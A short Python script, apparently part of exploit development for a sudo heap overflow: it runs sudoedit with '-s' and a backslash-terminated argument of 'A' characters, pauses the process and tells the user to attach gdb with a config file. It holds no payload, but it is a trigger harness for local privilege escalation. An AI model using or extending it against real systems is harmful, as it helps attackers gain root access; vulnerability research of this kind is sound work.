import subprocess, signal

cmd = ['/usr/local/bin/sudoedit', '-s', 'A'*10 + '\\']
env = {'BBBBB': 'CCCCC'}

# Starting the process
p = subprocess.Popen(cmd, env=env)
# Taking the pid
PID = p.pid
# Stopping it
p.send_signal(signal.SIGSTOP)
print("Don't close this window and use:")

input('gdb --pid={} -x ./gdb_config'.format(PID))
